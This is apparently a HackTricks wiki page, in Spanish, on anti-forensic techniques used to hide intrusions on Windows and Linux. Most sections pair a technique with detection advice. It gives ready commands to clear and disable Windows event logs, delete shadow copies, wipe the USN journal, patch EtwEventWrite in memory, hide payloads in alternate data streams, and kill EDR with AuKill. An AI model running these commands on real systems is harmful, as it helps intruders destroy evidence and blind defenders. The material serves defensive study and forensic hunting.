# Técnicas Anti-Forensic

{{#include ../../banners/hacktricks-training.md}}

## Marcas de tiempo

Un atacante puede estar interesado en **cambiar las marcas de tiempo de los archivos** para evitar ser detectado.\
Es posible encontrar las marcas de tiempo dentro de la MFT, en los atributos `$STANDARD_INFORMATION` \_\_ y \_\_ `$FILE_NAME`.

Ambos atributos tienen 4 marcas de tiempo: **modificación**, **acceso**, **creación** y **modificación del registro de la MFT** (MACE o MACB).

El **Explorador de Windows** y otras herramientas muestran la información de **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forensic Tool

Esta herramienta **modifica** la información de las marcas de tiempo dentro de **`$STANDARD_INFORMATION`**, pero **no** la información dentro de **`$FILE_NAME`**. Por lo tanto, es posible **identificar** actividad **sospechosa**.

### Usnjrnl

El **USN Journal** (Update Sequence Number Journal) es una funcionalidad de NTFS (Windows NT file system) que realiza un seguimiento de los cambios del volumen. La herramienta [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) permite examinar estos cambios.

![TimeStomp - Anti-forensic Tool - Usnjrnl: El USN Journal (Update Sequence Number Journal) es una funcionalidad de NTFS (Windows NT file system) que realiza un seguimiento de los cambios del volumen. La...](<../../images/image (801).png>)

La imagen anterior muestra la **salida** de la **herramienta**, donde se puede observar que se **realizaron algunos cambios** en el archivo.

### $LogFile

**Todos los cambios de metadatos en un sistema de archivos se registran** en un proceso conocido como [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Los metadatos registrados se almacenan en un archivo llamado `**$LogFile**`, ubicado en el directorio raíz de un sistema de archivos NTFS. Se pueden utilizar herramientas como [LogFileParser](https://github.com/jschicht/LogFileParser) para analizar este archivo e identificar cambios.

![Usnjrnl - $LogFile: Todos los cambios de metadatos en un sistema de archivos se registran en un proceso conocido como write-ahead logging. Los metadatos registrados se almacenan en un archivo llamado $LogFile , ubicado en el directorio raíz...](<../../images/image (137).png>)

De nuevo, en la salida de la herramienta es posible ver que **se realizaron algunos cambios**.

Utilizando la misma herramienta es posible identificar **a qué hora se modificaron las marcas de tiempo**:

![Usnjrnl - $LogFile: Utilizando la misma herramienta es posible identificar a qué hora se modificaron las marcas de tiempo](<../../images/image (1089).png>)

- CTIME: Hora de creación del archivo
- ATIME: Hora de modificación del archivo
- MTIME: Modificación del registro de la MFT del archivo
- RTIME: Hora de acceso al archivo

### Comparación de `$STANDARD_INFORMATION` y `$FILE_NAME`

Otra forma de identificar archivos modificados sospechosos sería comparar la hora de ambos atributos en busca de **incongruencias**.

### Nanosegundos

Las marcas de tiempo de **NTFS** tienen una **precisión** de **100 nanosegundos**. Por lo tanto, encontrar archivos con marcas de tiempo como 2010-10-10 10:10:**00.000:0000 es muy sospechoso**.

### SetMace - Anti-forensic Tool

Esta herramienta puede modificar ambos atributos, `$STARNDAR_INFORMATION` y `$FILE_NAME`. Sin embargo, desde Windows Vista, es necesario que un sistema operativo activo modifique esta información.

## Ocultación de datos

NFTS utiliza clústeres y el tamaño mínimo de información. Esto significa que, si un archivo ocupa un clúster y medio, la **mitad restante nunca se utilizará** hasta que se elimine el archivo. Por lo tanto, es posible **ocultar datos en este espacio slack**.

Existen herramientas como slacker que permiten ocultar datos en este espacio "oculto". Sin embargo, un análisis de `$logfile` y `$usnjrnl` puede mostrar que se añadieron algunos datos:

![SetMace - Anti-forensic Tool - Ocultación de datos: Existen herramientas como slacker que permiten ocultar datos en este espacio "oculto". Sin embargo, un análisis de $logfile y $usnjrnl puede mostrar que...](<../../images/image (1060).png>)

Por lo tanto, es posible recuperar el espacio slack utilizando herramientas como FTK Imager. Ten en cuenta que este tipo de herramientas puede guardar el contenido ofuscado o incluso cifrado.

## UsbKill

Esta es una herramienta que **apagará el equipo si detecta cualquier cambio en los puertos USB**.\
Una forma de descubrirlo sería inspeccionar los procesos en ejecución y **revisar cada script de Python en ejecución**.

## Distribuciones Linux Live

Estas distros se **ejecutan dentro de la memoria RAM**. La única forma de detectarlas es **si el sistema de archivos NTFS está montado con permisos de escritura**. Si se monta únicamente con permisos de lectura, no será posible detectar la intrusión.

## Eliminación segura

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Configuración de Windows

Es posible deshabilitar varios métodos de logging de Windows para dificultar mucho la investigación forense.

### Deshabilitar marcas de tiempo - UserAssist

Esta es una clave del registro que mantiene las fechas y horas en las que el usuario ejecutó cada archivo ejecutable.

Deshabilitar UserAssist requiere dos pasos:

1. Establecer en cero dos claves del registro, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` y `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, para indicar que queremos deshabilitar UserAssist.
2. Borrar las subclaves del registro que tengan un formato similar a `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Deshabilitar marcas de tiempo - Prefetch

Esto guarda información sobre las aplicaciones ejecutadas con el objetivo de mejorar el rendimiento del sistema Windows. Sin embargo, también puede ser útil para prácticas forenses.

- Ejecuta `regedit`
- Selecciona la ruta `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Haz clic derecho en `EnablePrefetcher` y `EnableSuperfetch`
- Selecciona Modificar en cada una para cambiar el valor de 1 (o 3) a 0
- Reinicia

### Deshabilitar marcas de tiempo - Hora del último acceso

Cada vez que se abre una carpeta desde un volumen NTFS en un servidor Windows NT, el sistema registra la hora para **actualizar un campo de marca de tiempo en cada carpeta incluida**, llamado hora del último acceso. En un volumen NTFS muy utilizado, esto puede afectar al rendimiento.

1. Abre el Editor del Registro (Regedit.exe).
2. Ve a `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Busca `NtfsDisableLastAccessUpdate`. Si no existe, añade este DWORD y establece su valor en 1, lo que deshabilitará el proceso.
4. Cierra el Editor del Registro y reinicia el servidor.

### Eliminar el historial de USB

Todas las **entradas de dispositivos USB** se almacenan en el Registro de Windows, bajo la clave del registro **USBSTOR**, que contiene subclaves creadas cada vez que conectas un dispositivo USB a tu PC o portátil. Puedes encontrar esta clave aquí: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Al eliminarla**, borrarás el historial de USB.\
También puedes utilizar la herramienta [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) para asegurarte de haberlas eliminado (y eliminarlas).

Otro archivo que guarda información sobre los dispositivos USB es `setupapi.dev.log`, ubicado en `C:\Windows\INF`. Este también debería eliminarse.

### Deshabilitar Shadow Copies

**Lista** las Shadow Copies con `vssadmin list shadowstorage`\
**Elimínalas** ejecutando `vssadmin delete shadow`

También puedes eliminarlas mediante la GUI siguiendo los pasos propuestos en [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Para deshabilitar las Shadow Copies, [sigue estos pasos](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Abre el programa Servicios escribiendo "services" en el cuadro de búsqueda de texto después de hacer clic en el botón de inicio de Windows.
2. En la lista, busca "Volume Shadow Copy", selecciónalo y accede a Propiedades haciendo clic derecho.
3. Selecciona Disabled en el menú desplegable "Startup type" y confirma el cambio haciendo clic en Apply y OK.

También es posible modificar en el registro qué archivos se copiarán en la Shadow Copy, en `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Sobrescribir archivos eliminados

- Puedes utilizar una **herramienta de Windows**: `cipher /w:C`. Esto indicará a cipher que elimine cualquier dato del espacio de disco disponible y sin utilizar de la unidad C.
- También puedes utilizar herramientas como [**Eraser**](https://eraser.heidi.ie)

### Eliminar los logs de eventos de Windows

- Windows + R --> eventvwr.msc --> Expande "Windows Logs" --> Haz clic derecho en cada categoría y selecciona "Clear Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Deshabilitar los logs de eventos de Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- En la sección de servicios, deshabilita el servicio "Windows Event Log"
- `WEvtUtil.exec clear-log` o `WEvtUtil.exe cl`

### Deshabilitar $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Manipulación avanzada de logs y rastros (2023-2025)

### PowerShell ScriptBlock/Module Logging

Las versiones recientes de Windows 10/11 y Windows Server mantienen **artefactos forenses detallados de PowerShell** en
`Microsoft-Windows-PowerShell/Operational` (eventos 4104/4105/4106).
Los atacantes pueden deshabilitarlos o borrarlos sobre la marcha:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Los defensores deben monitorizar los cambios en esas claves del registro y la eliminación masiva de eventos de PowerShell.

### ETW (Event Tracing for Windows) Patch

Los productos de seguridad de endpoints dependen en gran medida de ETW. Un método de evasión popular en 2024 consiste en hacer patch de `ntdll!EtwEventWrite`/`EtwEventWriteFull` en memoria para que cada llamada a ETW devuelva `STATUS_SUCCESS` sin emitir el evento:
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Los PoCs públicos (p. ej., `EtwTiSwallow`) implementan el mismo primitive en PowerShell o C++.
Como el parche es **local al proceso**, los EDR que se ejecutan dentro de otros procesos pueden no detectarlo.
Detección: comparar `ntdll` en memoria con la versión del disco, o aplicar el hook antes del user-mode.

### Reactivación de Alternate Data Streams (ADS)

En campañas de malware de 2023 (p. ej., **FIN12** loaders) se ha observado que alojan binarios de segunda etapa
dentro de ADS para mantenerse fuera del alcance de los escáneres tradicionales:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Enumera los streams con `dir /R`, `Get-Item -Stream *` o `streams64.exe` de Sysinternals.
Copiar el archivo host a FAT/exFAT o mediante SMB eliminará el stream oculto y puede ser utilizado
por los investigadores para recuperar el payload.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver se utiliza ahora habitualmente para **anti-forensics** en intrusiones
de ransomware.
La herramienta open-source **AuKill** carga un driver firmado pero vulnerable (`procexp152.sys`) para
suspender o terminar EDR y sensores forenses **antes del cifrado y la destrucción de logs**:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
El driver se elimina posteriormente, dejando artefactos mínimos.<sup>[[1]](#references)</sup>
Mitigaciones: habilitar la vulnerable-driver blocklist de Microsoft (HVCI/SAC)
y generar alertas ante la creación de servicios de kernel desde rutas escribibles por el usuario.

---

## Anti-Forensics en Linux: Self-Patching y Cloud C2 (2023–2025)

### Self-patching de servicios comprometidos para reducir la detección (Linux)
Los adversarios realizan cada vez más self-patching de un servicio justo después de explotarlo, tanto para evitar su reexplotación como para suprimir las detecciones basadas en vulnerabilidades. La idea consiste en reemplazar los componentes vulnerables por los últimos binarios/JAR legítimos del upstream, de modo que los scanners informen de que el host está parcheado mientras la persistencia y el C2 permanecen.<sup>[[3]](#references)</sup>

Ejemplo: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)<sup>[[3]](#references)[[4]](#references)</sup>
- Tras la explotación, los atacantes descargaron JAR legítimos desde Maven Central (repo1.maven.org), eliminaron los JAR vulnerables de la instalación de ActiveMQ y reiniciaron el broker.
- Esto cerró la RCE inicial mientras mantenía otros footholds (cron, cambios en la configuración de SSH e implants de C2 independientes).

Ejemplo operativo (ilustrativo)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Consejos de forense/hunting
- Revisar los directorios de servicios en busca de reemplazos de binarios/JAR no programados:
- Debian/Ubuntu: `dpkg -V activemq` y comparar los hashes/rutas de los archivos con los mirrors del repositorio.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Buscar versiones de JAR presentes en el disco que no pertenezcan al package manager, o symbolic links actualizados out of band.
- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` para correlacionar ctime/mtime con la ventana del compromiso.
- Historial del shell/telemetría de procesos: evidencias de `curl`/`wget` a `repo1.maven.org` u otros artifact CDNs inmediatamente después de la explotación inicial.
- Gestión de cambios: validar quién aplicó el “patch” y por qué, no solo que haya una versión parcheada presente.

### C2 de cloud-service con bearer tokens y anti-analysis stagers
El tradecraft observado combinó varias rutas de C2 de larga duración y packaging anti-analysis:<sup>[[3]](#references)</sup>
- Loaders ELF de PyInstaller protegidos con contraseña para dificultar el sandboxing y el análisis estático (por ejemplo, PYZ cifrado y extracción temporal bajo `/_MEI*`).
- Indicadores: resultados de `strings` como `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Artefactos de runtime: extracción a `/tmp/_MEI*` o rutas personalizadas de `--runtime-tmpdir`.
- C2 respaldado por Dropbox mediante hardcoded OAuth Bearer tokens
- Marcadores de red: `api.dropboxapi.com` / `content.dropboxapi.com` con `Authorization: Bearer <token>`.
- Buscar en proxy/NetFlow/Zeek/Suricata conexiones HTTPS salientes a dominios de Dropbox desde workloads de servidor que normalmente no sincronizan archivos.
- C2 paralelo/de respaldo mediante tunneling (por ejemplo, Cloudflare Tunnel `cloudflared`), manteniendo el control si se bloquea un canal.
- IOCs del host: procesos/unidades `cloudflared`, configuración en `~/.cloudflared/*.json`, conexiones salientes por 443 a los edges de Cloudflare.

### Persistence y “hardening rollback” para mantener el acceso (ejemplos de Linux)
Los atacantes suelen combinar self-patching con rutas de acceso duraderas:<sup>[[3]](#references)</sup>
- Cron/Anacron: modificaciones al stub `0anacron` en cada directorio `/etc/cron.*/` para la ejecución periódica.
- Hunt:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- Rollback del hardening de la configuración SSH: habilitar los logins de root y modificar los shells predeterminados de cuentas con pocos privilegios.
- Buscar la habilitación del login de root:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- Buscar shells interactivos sospechosos en cuentas del sistema (por ejemplo, `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Artefactos beacon aleatorios con nombres cortos (8 caracteres alfabéticos) depositados en el disco que también contactan con cloud C2:
- Hunt:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Los defensores deberían correlacionar estos artefactos con la exposición externa y los eventos de patching de servicios para descubrir la self-remediation anti-forensics utilizada para ocultar la explotación inicial.

## References

- [1] [Sophos X-Ops – AuKill: A Weaponized Vulnerable Driver for Disabling EDR (March 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching EtwEventWrite for Stealth: Detection & Hunting (June 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

{{#include ../../banners/hacktricks-training.md}}
